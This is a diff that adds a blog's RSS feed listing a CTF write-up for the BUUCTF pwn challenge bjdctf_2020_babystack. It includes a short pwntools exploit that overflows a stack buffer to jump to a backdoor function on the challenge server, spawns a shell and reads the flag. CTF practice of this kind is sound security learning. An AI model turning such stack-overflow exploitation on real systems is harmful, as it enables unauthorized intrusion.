@@ -1,0 +1,25 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>BUUCTP on NiceSeven&#39;s Website</title>
+    <link>https://niceseven.github.io/categories/buuctp/</link>
+    <description>Recent content in BUUCTP on NiceSeven&#39;s Website</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    <lastBuildDate>Fri, 03 Apr 2020 21:23:43 +0800</lastBuildDate>
+    
+	<atom:link href="https://niceseven.github.io/categories/buuctp/index.xml" rel="self" type="application/rss+xml" />
+    
+    
+    <item>
+      <title>BUUCTF Pwn Bjdctf_2020_babystack</title>
+      <link>https://niceseven.github.io/post/2020/04/03/buuctf-pwn-bjdctf_2020_babystack/</link>
+      <pubDate>Fri, 03 Apr 2020 21:23:43 +0800</pubDate>
+      
+      <guid>https://niceseven.github.io/post/2020/04/03/buuctf-pwn-bjdctf_2020_babystack/</guid>
+      <description>BUUCTF Pwn Bjdctf_2020_babystack 64位程序开启NX，有system(&amp;quot;/bin/sh&amp;quot;)，简单栈溢出
+#!/usr/bin/env python2 #-*- coding=UTF-8 -*- from pwn import * context.log_level = &amp;#39;debug&amp;#39; sh = process(&amp;#39;./bjdctf_2020_babystack&amp;#39;) sh = remote(&amp;#39;node3.buuoj.cn&amp;#39;,26495) backdoor_addr = 0x4006e6 readsize = 30 offset = 0x10 + 0x8 sh.sendlineafter(&amp;#34;name:&amp;#34;,&amp;#39;30&amp;#39;) payload = &amp;#39;a&amp;#39;*offset + p64(backdoor_addr) sh.sendlineafter(&amp;#34;name?&amp;#34;,payload) sh.sendline(&amp;#34;cat flag&amp;#34;) sh.interactive() </description>
+    </item>
+    
+  </channel>
+</rss>
